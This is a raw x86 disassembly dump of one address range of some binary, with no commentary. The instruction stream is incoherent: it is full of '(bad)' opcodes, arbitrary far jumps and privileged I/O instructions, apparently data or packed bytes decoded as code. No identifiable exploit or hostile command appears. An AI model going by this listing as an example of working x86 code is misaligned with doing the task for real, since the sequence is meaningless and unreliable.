  421833:	mov    dl,0xbb
  421835:	mov    ah,0x74
  421837:	arpl   WORD PTR [ebx+0x4adcbc8c],sp
  42183d:	aaa    
  42183e:	(bad)  
  42183f:	(bad)  
  421840:	mov    bl,bl
  421842:	bound  eax,QWORD PTR [eax+0x12198f0d]
  421848:	cmp    DWORD PTR [ecx+0x3b],0x6ce4898b
  42184f:	test   DWORD PTR [ebx],ebx
  421851:	popa   
  421852:	and    eax,0x59177a84
  421857:	adc    DWORD PTR [edi],ebp
  421859:	lds    ebp,FWORD PTR [esi-0x4e]
  42185c:	imul   ecx,esi,0x77db16ae
  421862:	xchg   esi,eax
  421863:	pop    ecx
  421864:	fs jmp 0x42195b
  42186a:	add    BYTE PTR [eax],al
  42186c:	add    BYTE PTR [eax],al
  42186e:	add    BYTE PTR [eax],al
  421870:	add    BYTE PTR [esi],bh
  421872:	inc    esi
  421873:	dec    edx
  421874:	mov    ebp,0xc7ffbd7a
  421879:	popa   
  42187a:	dec    edi
  42187b:	push   ds
  42187c:	sbb    DWORD PTR [eax+0x5d],ebx
  42187f:	bound  edx,QWORD PTR [ebx]
  421881:	and    eax,0xae000192
  421886:	add    eax,DWORD PTR [eax]
  421888:	add    cl,dl
  42188a:	sbb    al,0xa3
  42188c:	cli    
  42188d:	sub    BYTE PTR [edx],dl
  42188f:	xchg   DWORD PTR [ebx+0x5ba9eb92],ebp
  421895:	popf   
  421896:	stc    
  421897:	xchg   esp,eax
  421898:	jno    0x421915
  42189a:	mov    bh,0x4d
  42189c:	push   ecx
  42189d:	icebp  
  42189e:	xchg   ebp,eax
  42189f:	sbb    dl,BYTE PTR [esi-0x48a4744a]
  4218a5:	aas    
  4218a6:	ret    
  4218a7:	js     0x4218a8
  4218a9:	iret   
  4218aa:	mov    ch,0x2f
  4218ac:	xchg   BYTE PTR [eax],dl
  4218ae:	(bad)  
  4218af:	clc    
  4218b0:	mov    esi,0x5c191abe
  4218b5:	lods   eax,DWORD PTR ds:[esi]
  4218b6:	jp     0x4218f7
  4218b8:	out    dx,al
  4218b9:	clc    
  4218ba:	add    al,0x3b
  4218bc:	lock jmp 0x421856
  4218bf:	adc    DWORD PTR [ecx],0x3cef0cd8
  4218c5:	jno    0x421911
  4218c7:	ror    BYTE PTR [esi-0x63a2ada7],1
  4218cd:	sahf   
  4218ce:	inc    esp
  4218cf:	(bad)  
  4218d1:	fmul   st,st(2)
  4218d3:	int3   
  4218d4:	ror    ebp,0xe6
  4218d7:	xlat   BYTE PTR ds:[ebx]
  4218d8:	cmp    al,0x5e
  4218da:	push   ss
  4218db:	sub    ebx,ebp
  4218dd:	lea    edi,[eax-0x7acee403]
  4218e3:	and    al,0xb1
  4218e5:	or     eax,0x5308bed6
  4218ea:	sub    eax,0x27b6aba6
  4218ef:	test   eax,0x9c73156c
  4218f4:	sahf   
  4218f5:	stc    
  4218f6:	cdq    
  4218f7:	test   al,0x34
  4218f9:	lods   eax,DWORD PTR ds:[esi]
  4218fa:	jmp    0x6601914e
  4218ff:	sti    
  421900:	sbb    eax,0x94b7d298
  421905:	mov    ah,0x5b
  421907:	push   ebx
  421908:	loope  0x4218a8
  42190a:	lea    edx,gs:[eax-0x23]
  42190e:	(bad)  
  42190f:	xchg   ebx,eax
  421910:	stc    
  421911:	or     eax,0x267dcd37
  421916:	shl    BYTE PTR [ecx+0x646e03f3],0x62
  42191d:	outs   dx,BYTE PTR ds:[esi]
  42191e:	ss jge 0x4218a6
  421921:	dec    ebx
  421922:	push   eax
  421923:	call   0x6cd1:0x10fe9cbc
  42192a:	popa   
  42192b:	and    BYTE PTR [esi+0xcf59c24],cl
  421931:	mov    cl,0x5b
  421933:	jmp    0xb6b:0xc7431a79
  42193a:	sbb    eax,DWORD PTR [ecx+0x5e]
  42193d:	clc    
  42193e:	and    eax,0x9c4a3ded
  421943:	add    dh,al
  421945:	(bad)  
  421946:	not    esi
  421948:	push   edx
  421949:	dec    ebp
  42194a:	adc    DWORD PTR [eax+0x4772bb5a],0x39775a38
  421954:	sar    BYTE PTR [ecx-0x9],0x9
  421958:	loope  0x421966
  42195a:	mov    edx,0x9f72fa57
  42195f:	cmp    DWORD PTR [esi-0x7f],eax
  421962:	dec    edx
  421963:	lods   al,BYTE PTR ds:[esi]
  421964:	pusha  
  421965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421966:	cmp    eax,0x2874fbd8
  42196b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42196c:	or     eax,0x87245f57
  421971:	dec    ecx
  421972:	dec    esi
  421973:	pop    esi
  421974:	push   ss
  421975:	pop    ebx
  421976:	and    al,0xca
  421978:	or     al,0xe8
  42197a:	xor    al,0xb6
  42197c:	jno    0x4219ba
  42197e:	sub    BYTE PTR [ebp-0x4a],al
  421981:	stos   BYTE PTR es:[edi],al
  421982:	mov    bh,0x94
  421984:	sub    ebx,DWORD PTR [edi-0x255ecfd5]
  42198a:	ffreep st(2)
  42198c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42198d:	(bad)  
  42198f:	xor    esi,DWORD PTR [esi]
  421991:	jle    0x4219bb
  421993:	sbb    al,0x2c
  421995:	cmp    edi,DWORD PTR [edx+0x56ee6bee]
  42199b:	cmp    al,0xcd
  42199d:	xchg   ebp,eax
  42199e:	ins    DWORD PTR es:[edi],dx
  42199f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219a0:	int    0x25
  4219a2:	sti    
  4219a3:	xor    eax,0xcb85ec4d
  4219a8:	clc    
  4219a9:	jae    0x421932
  4219ab:	in     eax,0x85
  4219ad:	hlt    
  4219ae:	cmp    DWORD PTR [esi+0x4f778c4e],0xed7908f5
  4219b8:	pop    esp
  4219b9:	xchg   ecx,eax
  4219ba:	stc    
  4219bb:	scas   al,BYTE PTR es:[edi]
  4219bc:	arpl   WORD PTR [edx-0x30],bp
  4219bf:	adc    DWORD PTR [eax+0x391ae3db],ebp
  4219c5:	dec    esi
  4219c6:	int    0xe6
  4219c8:	mov    eax,ds:0xf5ec332
  4219cd:	aas    
  4219ce:	call   0xa9e63027
  4219d3:	xor    eax,0x34a379cf
  4219d8:	aad    0xd7
  4219da:	pop    es
  4219db:	ds xchg esp,eax
  4219dd:	aaa    
  4219de:	cmova  ebx,DWORD PTR ds:0x435e53bc
  4219e5:	sub    eax,0x497cc806
  4219ea:	fmulp  st(7),st
  4219ec:	lods   eax,DWORD PTR ds:[esi]
  4219ed:	dec    ebp
  4219ee:	jecxz  0x421a6d
  4219f0:	fst    QWORD PTR [eax+0x5f]
  4219f3:	push   0x7
  4219f5:	in     eax,0x91
  4219f7:	pusha  
  4219f8:	pop    ecx
  4219f9:	push   edx
  4219fa:	(bad)  
  4219fb:	pushf  
  4219fc:	jo     0x421a2c
  4219fe:	sbb    al,0x94
  421a00:	lods   eax,DWORD PTR ds:[esi]
  421a01:	aad    0x3f
  421a03:	gs in  al,0x4b
  421a06:	mov    WORD PTR ds:0xdb702afb,gs
  421a0c:	(bad)  
  421a0d:	sub    BYTE PTR [edx],ah
  421a0f:	test   eax,0x95af18a0
  421a14:	out    dx,eax
  421a15:	xor    DWORD PTR [esi],esi
  421a17:	repz adc edi,edx
  421a1a:	ret    
  421a1b:	jns    0x4219f7
  421a1d:	xorps  xmm4,XMMWORD PTR [ebx]
  421a20:	(bad)  [eax]
  421a22:	adc    cl,dh
  421a24:	sbb    al,0xfd
  421a26:	xor    eax,0x59df33c1
  421a2b:	jg     0x421a8b
  421a2d:	xchg   BYTE PTR [ebx+0x5bbbcd11],bh
  421a33:	xchg   edx,eax
  421a34:	sti    
  421a35:	sahf   
  421a36:	adc    dl,al
  421a38:	or     bl,BYTE PTR [edx-0x12360d65]
  421a3e:	arpl   WORD PTR [ebx],si
  421a40:	inc    esi
  421a41:	fist   DWORD PTR [esi+0x14]
  421a44:	dec    eax
  421a45:	fldcw  WORD PTR [ebp+0x13212588]
  421a4b:	mov    dh,0xb
  421a4d:	adc    al,0x6d
  421a4f:	jb     0x421a98
  421a51:	mov    esp,0x3fd55e2
  421a56:	jg     0x421aa6
  421a58:	fmul   QWORD PTR [edi]
  421a5a:	sahf   
  421a5b:	sub    bh,BYTE PTR [edx+ecx*4+0x4a81725c]
  421a62:	ins    DWORD PTR es:[edi],dx
  421a63:	std    
  421a64:	jne    0x421a60
  421a66:	into   
  421a67:	jmp    0x421a10
  421a69:	jb     0x421aa7
  421a6b:	cmp    DWORD PTR [edi-0x6244b856],ecx
  421a71:	(bad)  
  421a73:	repnz stc 
  421a75:	mov    esp,ebx
  421a77:	xor    dh,bl
  421a79:	pop    ebx
  421a7a:	stos   BYTE PTR es:[edi],al
  421a7b:	rcl    ecx,0xb6
  421a7e:	jb     0x421a5a
  421a80:	add    ah,BYTE PTR [ebp+ebp*8+0x46df3df0]
  421a87:	push   0xb631faea
  421a8c:	dec    di
  421a8e:	icebp  
  421a8f:	or     edx,ebx
  421a91:	dec    ecx
  421a92:	ins    BYTE PTR es:[edi],dx
  421a93:	outs   dx,DWORD PTR ds:[esi]
  421a94:	popa   
  421a95:	xchg   esi,eax
  421a96:	inc    ebx
  421a97:	cmp    edx,DWORD PTR [edx-0x11]
  421a9a:	jo     0x421a4f
  421a9c:	sbb    ebx,esi
  421a9e:	jmp    0x2eb2:0xbd53c7c6
  421aa5:	inc    edx
  421aa6:	dec    ebp
  421aa7:	add    BYTE PTR [ebp+0x31],bl
  421aaa:	inc    ebx
  421aab:	push   ebx
  421aac:	inc    esp
  421aad:	xor    esp,DWORD PTR [ebp-0x77]
  421ab0:	dec    esp
  421ab1:	scas   al,BYTE PTR es:[edi]
  421ab2:	imul   edx,DWORD PTR [edx+0x49],0x33c231f4
  421ab9:	call   DWORD PTR [eax]
  421abb:	in     al,dx
  421abc:	inc    esi
  421abd:	inc    eax
  421abe:	ins    DWORD PTR es:[edi],dx
  421abf:	cmc    
  421ac0:	fbstp  TBYTE PTR [edi+0x4c]
  421ac3:	mov    esp,0x4e629c8
  421ac8:	leave  
  421ac9:	jle    0x421ac4
  421acb:	in     eax,dx
  421acc:	sub    ebx,DWORD PTR [ebp+0x65]
  421acf:	test   DWORD PTR [ecx],ebp
  421ad1:	call   0x1e19f677
  421ad6:	xor    ch,BYTE PTR [edi+edx*4+0x18]
  421ada:	ror    dl,1
  421adc:	inc    edx
  421add:	push   ss
  421ade:	xor    eax,0xa022e6aa
  421ae3:	int3   
  421ae4:	and    eax,0x8abf9d1
  421ae9:	(bad)  
  421aea:	jge    0x421aba
  421aec:	inc    edi
  421aed:	jl     0x421b19
  421aef:	xlat   BYTE PTR ds:[ebx]
  421af0:	imul   edi,DWORD PTR [edx],0xc6c5276b
  421af6:	xor    eax,DWORD PTR [esi]
  421af8:	and    bl,0x5c
  421afb:	test   BYTE PTR [ecx],dh
  421afd:	adc    dl,BYTE PTR [ecx]
  421aff:	stc    
  421b00:	lds    edi,FWORD PTR [edx+0x6c]
  421b03:	pop    edx
  421b04:	add    eax,0x2b7fb557
  421b09:	mov    BYTE PTR [ecx+ecx*8+0x77f5d2ab],dl
  421b10:	and    BYTE PTR [ecx+0x3c],cl
  421b13:	lea    eax,[esi+0x5d]
  421b16:	pop    eax
  421b17:	xor    BYTE PTR [ecx],0x8e
  421b1a:	xchg   edi,eax
  421b1b:	sbb    esp,DWORD PTR [ebx+0x382e7c71]
  421b21:	ss fmulp st(6),st
  421b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b25:	cmp    DWORD PTR ds:0xd4a70893,ebx
  421b2b:	xchg   bx,ax
  421b2d:	sbb    bh,BYTE PTR [edx-0x3404bcfd]
  421b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b34:	jle    0x421af9
  421b36:	mov    esp,0x5d22efab
  421b3b:	mov    WORD PTR [ebx-0x472d30b],fs
  421b41:	sbb    DWORD PTR cs:[eax+0x49],ebp
  421b45:	mov    bh,0xdd
  421b47:	outs   dx,DWORD PTR ds:[esi]
  421b48:	retf   0xe3b9
  421b4b:	mov    ecx,DWORD PTR ds:[ebp-0x1debf3b8]
  421b52:	mov    bh,0x7
  421b54:	fadd   QWORD PTR [edx-0x488577c4]
  421b5a:	pop    ecx
  421b5b:	mov    ds:0x1d11b8d0,al
  421b60:	dec    ebx
  421b61:	xchg   ebx,eax
  421b62:	sbb    esp,DWORD PTR [ecx]
  421b64:	pop    eax
  421b65:	mov    bh,BYTE PTR [edi+ecx*1-0x11]
  421b69:	adc    ah,BYTE PTR [edx-0x40]
  421b6c:	ret    
  421b6d:	xchg   edi,eax
  421b6e:	loope  0x421bc9
  421b70:	inc    esi
  421b71:	adc    DWORD PTR [ebx],edx
  421b73:	clc    
  421b74:	lea    esi,[edi-0x53]
  421b77:	aam    0x24
  421b79:	test   BYTE PTR [ebx+0x50],bl
  421b7c:	jns    0x421b4c
  421b7e:	out    dx,eax
  421b7f:	xchg   edi,eax
  421b80:	push   cs
  421b81:	xor    bl,BYTE PTR [edx+0x42]
  421b84:	jae    0x421bfe
  421b86:	sar    DWORD PTR [ebx-0x63],1
  421b89:	arpl   WORD PTR [edx+0x75],bx
  421b8c:	jecxz  0x421b7d
  421b8e:	and    eax,0x5f23f0d0
  421b93:	retf   0xca18
  421b96:	or     al,0xf2
  421b98:	stc    
  421b99:	ins    DWORD PTR es:[edi],dx
  421b9a:	xchg   esp,eax
  421b9b:	stos   BYTE PTR es:[edi],al
  421b9c:	jl     0x421bbb
  421b9e:	aad    0xa7
  421ba0:	push   ds
  421ba1:	push   esp
  421ba2:	adc    al,0x27
  421ba4:	dec    edi
  421ba5:	xchg   esp,eax
  421ba6:	mov    ecx,0xbe787e9d
  421bab:	xor    BYTE PTR [edx],al
  421bad:	sub    BYTE PTR [eax+edi*1+0x42],0x91
  421bb2:	fist   DWORD PTR [edx+0x568aca90]
  421bb8:	inc    esp
  421bb9:	dec    edi
  421bba:	and    ebp,DWORD PTR [eax-0x736a5b85]
  421bc0:	fnstcw WORD PTR [ebp+ebx*4-0x1983af8e]
  421bc7:	stos   DWORD PTR es:[edi],eax
  421bc8:	adc    BYTE PTR [esi+ebx*2-0x789610ec],ch
  421bcf:	dec    ebx
  421bd0:	inc    edx
  421bd1:	xor    ch,BYTE PTR [eax+0x28]
  421bd4:	ins    DWORD PTR es:[edi],dx
  421bd5:	neg    DWORD PTR [esi+0x57617d75]
  421bdb:	les    esi,FWORD PTR [edi-0x2b]
  421bde:	rcr    BYTE PTR [esi-0x7d],0x9a
  421be2:	(bad)  
  421be3:	jnp    0x421bdb
  421be5:	add    al,0xb4
  421be7:	sub    al,0xd0
  421be9:	or     DWORD PTR [edx+0x1261b362],ebp
  421bef:	nop
  421bf0:	pop    es
  421bf1:	(bad)  
  421bf2:	pusha  
  421bf3:	in     eax,dx
  421bf4:	xchg   BYTE PTR [ebx],dl
  421bf6:	sbb    cl,BYTE PTR [eax-0x21e9fb76]
  421bfc:	mov    bh,0x7d
  421bfe:	sub    al,BYTE PTR [ebp-0x89adda4]
  421c04:	cmp    eax,0xb3a85e79
  421c09:	inc    esi
  421c0a:	jg     0x421c1a
  421c0c:	sub    ebp,0xffffffe6
  421c0f:	inc    edx
  421c10:	lods   eax,DWORD PTR ds:[esi]
  421c11:	inc    esi
  421c12:	fisttp DWORD PTR [edx]
  421c14:	dec    edi
  421c15:	mov    ebp,gs
  421c17:	jp     0x421beb
  421c19:	pop    ebp
  421c1a:	imul   BYTE PTR [ecx]
  421c1c:	add    BYTE PTR [ecx],ah
  421c1e:	jo     0x421c9d
  421c20:	mov    BYTE PTR [ebx-0xb],bh
  421c23:	jbe    0x421c4e
  421c25:	lods   eax,DWORD PTR ds:[esi]
  421c26:	retf   0x9be
  421c29:	pusha  
  421c2a:	sbb    al,0x72
  421c2c:	ret    
  421c2d:	fdivp  st(7),st
  421c2f:	frstor [ebx-0x94de444]
  421c35:	(bad)  
  421c36:	add    eax,0x0
  421c3b:	add    BYTE PTR [eax],al
  421c3d:	add    BYTE PTR [eax],al
  421c3f:	add    BYTE PTR [eax],al
  421c41:	or     al,0xc2
  421c43:	xlat   BYTE PTR ds:[ebx]
  421c44:	and    bl,bh
  421c46:	aaa    
  421c47:	std    
  421c48:	out    dx,al
  421c49:	and    eax,0x9b971a56
  421c4e:	stc    
  421c4f:	jo     0x421c45
  421c51:	rcl    DWORD PTR [ebp+0x3ae0001],cl
  421c57:	add    BYTE PTR [eax],al
  421c59:	js     0x421cd5
  421c5b:	pushf  
  421c5c:	loop   0x421c53
  421c5e:	lock sub dh,bh
  421c61:	inc    BYTE PTR es:[ecx-0xe]
  421c65:	inc    edi
  421c66:	mov    esp,0xa71f0dc2
  421c6b:	dec    ecx
  421c6c:	popf   
  421c6d:	mov    ds:0x64eef1b6,al
  421c72:	cmp    ebx,DWORD PTR [ebx]
  421c74:	inc    eax
  421c75:	inc    ecx
  421c76:	sbb    bl,bh
  421c78:	clc    
  421c79:	jp     0x421c17
  421c7b:	xchg   ebx,eax
  421c7c:	psllq  mm6,mm4
  421c7f:	test   al,0x17
  421c81:	pop    edx
  421c82:	ins    BYTE PTR es:[edi],dx
  421c83:	aad    0x4d
  421c85:	js     0x421c7e
  421c87:	mov    ds:0xdfad0b62,eax
  421c8c:	pop    ecx
  421c8d:	call   0x7319:0xe2d1724c
  421c94:	jmp    0x421c93
  421c96:	mov    al,ds:0xd8cbefe4
  421c9b:	dec    eax
  421c9c:	(bad)  
  421c9d:	scas   al,BYTE PTR es:[edi]
  421c9e:	sbb    al,0xf
  421ca0:	std    
  421ca1:	out    0x30,eax
  421ca3:	jg     0x421cd4
  421ca5:	jo     0x421ce5
  421ca7:	sbb    DWORD PTR [ebp-0x5e],0x3c406ea5
  421cae:	push   ebp
  421caf:	mov    ds:0xb504db18,eax
  421cb4:	add    BYTE PTR [esi-0x658047f0],dl
  421cba:	xor    eax,0x67d4906f
  421cbf:	jge    0x421c41
  421cc1:	vpackuswb ymm2,ymm5,YMMWORD PTR [eax-0x4d3c744b]
  421cc9:	add    eax,edx
  421ccb:	lea    esp,[esi*4+0x55c9e97f]
  421cd2:	cwde   
  421cd3:	ja     0x421d2f
  421cd5:	aaa    
  421cd6:	mov    eax,ds:0x38f2dceb
  421cdb:	fwait
  421cdc:	push   esp
  421cdd:	jns    0x421d00
  421cdf:	jl     0x421d0b
  421ce1:	es std 
  421ce3:	repz dec ebx
  421ce5:	pop    ebp
  421ce6:	fild   QWORD PTR [ebx]
  421ce8:	and    eax,0x745b3f38
  421ced:	jmp    0xab53:0x571e7f07
  421cf4:	sub    al,0xfe
  421cf6:	cwde   
  421cf7:	mov    ds:0xa9800d8,eax
  421cfc:	mov    al,0xdf
  421cfe:	(bad)  
  421cff:	int    0x98
  421d01:	mov    al,ds:0x61ec9f2c
  421d06:	test   bh,ch
  421d08:	fadd   DWORD PTR [esp+ecx*4+0x7c4e1330]
  421d0f:	fild   WORD PTR [edi-0x55b631]
  421d15:	lock jno 0x421caa
  421d18:	xor    BYTE PTR [ebx-0x61d91f8b],cl
  421d1e:	pop    es
  421d1f:	int3   
  421d20:	jl     0x421d23
  421d22:	adc    bl,BYTE PTR [eax+0x3d4a17aa]
  421d28:	into   
  421d29:	jle    0x421d03
  421d2b:	mov    esp,fs
  421d2d:	pop    ds
  421d2e:	inc    ecx
  421d2f:	lock or bl,dl
  421d32:	enter  0x7014,0x90
  421d36:	pop    edx
  421d37:	cmp    BYTE PTR [esi],bh
  421d39:	outs   dx,BYTE PTR ds:[esi]
  421d3a:	add    al,BYTE PTR [ebx+ebx*1]
  421d3d:	in     al,dx
  421d3e:	daa    
  421d3f:	push   ecx
  421d40:	daa    
  421d41:	lods   al,BYTE PTR ds:[esi]
  421d42:	sbb    eax,0xea91342
  421d47:	inc    eax
  421d48:	les    eax,FWORD PTR [ebp-0x5a]
  421d4b:	xchg   BYTE PTR [edx+0x78f41c27],ch
  421d51:	mov    DWORD PTR [edi],esp
  421d53:	(bad)  
  421d54:	int    0xe3
  421d56:	jge    0x421d24
  421d58:	idiv   DWORD PTR [eax+0x55809ae2]
  421d5e:	or     BYTE PTR [edi+0x500cc945],al
  421d64:	or     BYTE PTR [ebx+0x31],cl
  421d67:	sub    ecx,DWORD PTR [edi+eiz*4+0x24]
  421d6b:	pop    esi
  421d6c:	add    al,0x3
  421d6e:	shr    WORD PTR [edi+0x4b],0x3e
  421d73:	mov    esp,0xdea5a2d9
  421d78:	mov    bl,ah
  421d7a:	dec    esi
  421d7b:	sti    
  421d7c:	add    bh,BYTE PTR [esi-0x295c566f]
  421d82:	jae    0x421dfb
  421d84:	nop
  421d85:	ds stc 
  421d87:	mov    al,ds:0x56890f37
  421d8c:	js     0x421d21
  421d8e:	mul    ch
  421d90:	cmp    ch,BYTE PTR [ecx]
  421d92:	sbb    dl,ch
  421d94:	or     DWORD PTR [edx+esi*4],0xffffff98
  421d98:	pushf  
  421d99:	mov    WORD PTR [edi+ecx*8+0x57977af7],ss
  421da0:	pop    eax
  421da1:	sub    bl,dh
  421da3:	cs aas 
  421da5:	add    BYTE PTR [edx+0x7744dfeb],ch
  421dab:	jo     0x421d9d
  421dad:	mov    ebp,0x441a0a5d
  421db2:	lods   al,BYTE PTR ds:[esi]
  421db3:	sbb    al,0x6d
  421db5:	adc    DWORD PTR ds:0xc761aec,esi
  421dbb:	xor    al,0x2e
  421dbd:	mov    ds:0xe1c058c2,eax
  421dc2:	mov    al,0x81
  421dc4:	mov    dh,0x37
  421dc6:	imul   esi,DWORD PTR [ecx],0x193e0fda
  421dcc:	mov    eax,0x5171d712
  421dd1:	jns    0x421db4
  421dd3:	repnz push ebx
  421dd5:	ret    0x434
  421dd8:	xchg   ebx,eax
  421dd9:	sub    cl,BYTE PTR [ecx-0x9]
  421ddc:	pop    ds
  421ddd:	xchg   edi,eax
  421dde:	mov    eax,0x96114b95
  421de3:	retf   
  421de4:	cmc    
  421de5:	xchg   DWORD PTR [ebx+0x476fe2f1],ecx
  421deb:	jg     0x421d97
  421ded:	pop    eax
  421dee:	cdq    
  421def:	enter  0x2e4a,0x5f
  421df3:	dec    ebx
  421df4:	div    DWORD PTR [esi]
  421df6:	jb     0x421db4
  421df8:	outs   dx,BYTE PTR ds:[esi]
  421df9:	daa    
  421dfa:	add    BYTE PTR [edx+edi*8-0x4618709e],bh
  421e01:	or     ecx,DWORD PTR [ecx+esi*8+0x41]
  421e05:	dec    ebp
  421e06:	test   ebx,esi
  421e08:	pop    eax
  421e09:	mov    bl,0x2a
  421e0b:	sahf   
  421e0c:	adc    bl,BYTE PTR [ebx]
  421e0e:	mov    bl,0x32
  421e10:	push   0xa
  421e12:	add    ch,bh
  421e14:	ja     0x421e66
  421e16:	pop    ds
  421e17:	ret    
  421e18:	xchg   edi,eax
  421e19:	icebp  
  421e1a:	mov    eax,ds:0x637d866a
  421e1f:	xchg   ecx,eax
  421e20:	outs   dx,BYTE PTR ds:[esi]
  421e21:	jp     0x421dac
  421e23:	adc    eax,0xf57a15e8
  421e28:	mov    eax,0xdb67b2c5
  421e2d:	into   
  421e2e:	sub    BYTE PTR [esi+eiz*1+0x50],bl
  421e32:	jo     0x421eac
  421e34:	jmp    0xb2a0:0x4e1a820d
  421e3b:	stc    
  421e3c:	jbe    0x421e7a
  421e3e:	(bad)  
  421e3f:	mov    bl,0xf9
  421e41:	push   ecx
  421e42:	xor    al,0x3a
  421e44:	adc    eax,0x9478dca2
  421e49:	add    DWORD PTR [eax-0x4caf8598],esp
  421e4f:	repnz mov al,ds:0x16d0237a
  421e55:	scas   eax,DWORD PTR es:[edi]
  421e56:	popf   
  421e57:	out    dx,eax
  421e58:	pop    ss
  421e59:	mov    ecx,ebp
  421e5b:	mov    dl,0x8f
  421e5d:	mov    cl,0x78
  421e5f:	retf   
  421e60:	dec    ebx
  421e61:	out    dx,al
  421e62:	bound  edi,QWORD PTR ds:[eax]
  421e65:	out    dx,al
  421e66:	daa    
  421e67:	(bad)  
  421e69:	aad    0x91
  421e6b:	pop    edx
  421e6c:	mov    eax,ds:0x1eecfc3
  421e71:	aad    0x81
  421e73:	jne    0x421ec9
  421e75:	jle    0x421ebf
  421e77:	jl     0x421e3f
  421e79:	xchg   edx,eax
  421e7a:	addr16 call 0xb5dccfea
  421e80:	add    al,0xc4
  421e82:	sbb    esp,0x640906a0
  421e88:	addr16 addr16 pop ebp
  421e8b:	inc    edx
  421e8c:	jne    0x421e5a
  421e8e:	fisub  DWORD PTR [eax-0x5e]
  421e91:	loope  0x421e7a
  421e93:	inc    esi
  421e94:	xchg   ebx,eax
  421e95:	jmp    0xff93fe98
  421e9a:	add    eax,0xf81474e9
  421e9f:	iret   
  421ea0:	shl    BYTE PTR [edx+0x17],cl
  421ea3:	add    al,0x2
  421ea5:	add    al,0x7c
  421ea7:	inc    edi
  421ea8:	adc    BYTE PTR [edi+0x3b],dh
  421eab:	mov    esi,0x1ed64746
  421eb0:	into   
  421eb1:	adc    eax,0xd3e0b884
  421eb6:	and    eax,0xc464406d
  421ebb:	aad    0xd9
  421ebd:	inc    eax
  421ebe:	int    0xed
  421ec0:	ins    DWORD PTR es:[edi],dx
  421ec1:	jno    0x421e75
  421ec3:	and    eax,0xaf82d7fd
  421ec8:	xchg   ecx,eax
  421ec9:	fsub   DWORD PTR [esi+0x34]
  421ecc:	fsub   QWORD PTR [ebp-0x5]
  421ecf:	es pop es
  421ed1:	loop   0x421ea5
  421ed3:	jns    0x421eec
  421ed5:	push   es
  421ed6:	sub    eax,0x2086bbeb
  421edb:	lea    esi,[eax+0x1c]
  421ede:	in     eax,dx
  421edf:	sub    DWORD PTR [edi-0x67],esp
  421ee2:	cmp    al,0x14
  421ee4:	pop    es
  421ee5:	sahf   
  421ee6:	sub    BYTE PTR [edi+0x62],0x35
  421eea:	les    eax,FWORD PTR [ecx+0x77433607]
  421ef0:	sbb    al,0xbb
  421ef2:	icebp  
  421ef3:	cld    
  421ef4:	xlat   BYTE PTR ds:[ebx]
  421ef5:	xlat   BYTE PTR ds:[ebx]
  421ef6:	xchg   esi,eax
  421ef7:	lods   eax,DWORD PTR ds:[esi]
  421ef8:	fisttp DWORD PTR [esi+0x55d96377]
  421efe:	mov    ebx,0xb3814c80
  421f03:	mov    al,0x91
  421f05:	pop    esi
  421f06:	or     DWORD PTR [edi-0x1ec3cecc],ebp
  421f0c:	sub    DWORD PTR [edi+0x5c],eax
  421f0f:	(bad)  
  421f10:	jb     0x421f8b
  421f12:	mov    WORD PTR [edi],es
  421f14:	cli    
  421f15:	aaa    
  421f16:	fild   QWORD PTR [esi]
  421f18:	mov    ebx,0x23c4a6b1
  421f1d:	mov    edx,?
  421f1f:	xchg   edx,eax
  421f20:	dec    eax
  421f21:	push   es
  421f22:	js     0x421f98
  421f24:	fcomp  QWORD PTR [edi-0x5d]
  421f27:	stos   DWORD PTR es:[edi],eax
  421f28:	xor    eax,0x814d3900
  421f2d:	sbb    al,0x60
  421f2f:	jmp    0x2cd58550
  421f34:	add    DWORD PTR [edx],edx
  421f36:	pushf  
  421f37:	push   cs
  421f38:	xchg   DWORD PTR [ebx+0x6430993a],ecx
  421f3e:	(bad)  
  421f3f:	iret   
  421f40:	dec    ecx
  421f41:	and    eax,0x253ec006
  421f46:	add    ah,BYTE PTR [edi+0x71bdaac]
  421f4c:	bound  ecx,QWORD PTR ds:0x28403e34
  421f52:	retf   0x7bd6
  421f55:	ja     0x421f77
  421f57:	dec    ecx
  421f58:	sub    esp,ecx
  421f5a:	ins    DWORD PTR es:[edi],dx
  421f5b:	xchg   ecx,eax
  421f5c:	add    dh,BYTE PTR [eax-0x24]
  421f5f:	int    0xd6
  421f61:	xchg   esp,ebx
  421f63:	mov    edi,0x46520ee2
  421f68:	(bad)  
  421f69:	retf   0x6a42
  421f6c:	pop    es
  421f6d:	int3   
  421f6e:	add    esp,edx
  421f70:	outs   dx,WORD PTR ds:[esi]
  421f72:	mov    esi,0x30a59844
  421f77:	call   0xa52b5f00
  421f7c:	hlt    
  421f7d:	cmp    BYTE PTR [ecx+0x56862a5],ah
  421f83:	ss pop ds
  421f85:	add    al,0xd8
  421f87:	cmp    BYTE PTR [edi-0x42],ah
  421f8a:	sub    BYTE PTR [esi+0x5e6ba565],dh
  421f90:	scas   al,BYTE PTR es:[edi]
  421f91:	stos   BYTE PTR es:[edi],al
  421f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f93:	(bad)  
  421f94:	icebp  
  421f95:	xchg   ebp,eax
  421f96:	rcl    ebx,0xe1
  421f99:	jl     0x421fe6
  421f9b:	xor    esp,DWORD PTR [esi+0x5e]
  421f9e:	xor    ebp,DWORD PTR [edx+0x1b]
  421fa1:	mov    esi,0x7c73d2c4
  421fa6:	mov    esp,0xa613e6da
  421fab:	and    al,0xb2
  421fad:	mov    ecx,0x1b93525a
  421fb2:	and    DWORD PTR [esi-0xc3b2302],0x3f
  421fb9:	scas   al,BYTE PTR es:[edi]
  421fba:	push   esp
  421fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fbc:	icebp  
  421fbd:	sbb    al,0x33
  421fbf:	sub    esi,edx
  421fc1:	sub    cl,BYTE PTR [edi]
  421fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fc4:	lods   al,BYTE PTR ds:[esi]
  421fc5:	or     BYTE PTR [edi+edx*2-0x62eb8f4c],bh
  421fcc:	and    al,0x53
  421fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fcf:	push   esp
  421fd0:	test   BYTE PTR ds:0x75390db7,bh
  421fd6:	jo     0x421fc8
  421fd8:	test   al,0x94
  421fda:	pop    ss
  421fdb:	push   esi
